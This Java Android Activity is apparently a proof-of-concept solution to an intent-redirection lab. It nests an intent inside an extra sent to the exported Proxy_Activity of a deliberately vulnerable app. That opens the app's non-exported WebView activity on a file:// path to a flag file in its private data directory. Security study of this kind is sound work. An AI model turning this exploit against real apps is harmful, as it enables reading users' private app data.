package com.example.intentredirect;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class Activity3 extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_3);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });
        Intent exploitIntent = new Intent();
        exploitIntent.setComponent(new ComponentName("com.example.intetn_redirect_vuln", "com.example.intetn_redirect_vuln.Proxy_Activity"));

        Intent maliciousIntent = new Intent();
        maliciousIntent.setComponent(new ComponentName("com.example.intetn_redirect_vuln", "com.example.intetn_redirect_vuln.NonExportedWebViewActivity"));

        maliciousIntent.putExtra("extra_url", "file:///data/data/com.example.intetn_redirect_vuln/files/Flag_4sdf8wdaf5a7faf5fs7_.txt");

        exploitIntent.putExtra("extra_intent", maliciousIntent);

        startActivity(exploitIntent);
    }

}